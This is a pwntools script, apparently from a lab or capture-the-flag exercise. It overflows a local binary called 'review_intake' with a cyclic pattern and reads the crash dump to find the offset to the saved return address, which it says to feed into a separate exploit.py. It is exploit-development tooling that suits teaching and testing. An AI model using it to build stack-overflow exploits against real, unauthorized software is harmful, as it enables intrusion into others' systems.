#!/usr/bin/env python3
# =============================================================================
#  find_offset.py -- determine the exact overflow offset automatically
# =============================================================================
#
#  How it works:
#    1. Send a De Bruijn ("cyclic") pattern as the review comment. Every
#       4-byte window in this pattern is unique.
#    2. The overflow overwrites the saved return address with 4 of those
#       bytes, the program `ret`s to that garbage address, and crashes.
#    3. We read the faulting address (EIP) from the core/signal and ask
#       pwntools which position in the pattern produced it. That position
#       IS the distance from the buffer to the return address = the offset.
#
#  Run:   python3 find_offset.py
#  Then put the printed number into exploit.py's OFFSET.
# =============================================================================

from pwn import *

context.clear(arch='i386', os='linux')
context.log_level = 'warning'

BINARY = './review_intake'

def main():
    pattern = cyclic(200, n=4)

    p = process(BINARY)
    p.sendlineafter(b'Choice: ',       b'1')
    p.sendlineafter(b'Product name: ', b'demo')
    p.sendlineafter(b'Rating (1-5): ', b'5')
    p.sendafter(b'> ',                 pattern)
    p.wait()

    core = p.corefile
    eip  = core.eip
    fault = core.fault_addr
    log.warning("crashed with eip=%#x fault_addr=%#x", eip, fault)

    # EIP holds the 4 pattern bytes that landed on the return address.
    offset = cyclic_find(p32(eip), n=4)
    if offset < 0:
        # Fall back to the faulting address if eip wasn't a clean 4-byte window.
        offset = cyclic_find(p32(fault & 0xffffffff), n=4)

    print()
    print("================================================")
    print(f"  Overflow offset to return address: {offset}")
    print(f"  --> set  OFFSET = {offset}  in exploit.py")
    print("================================================")

if __name__ == '__main__':
    main()
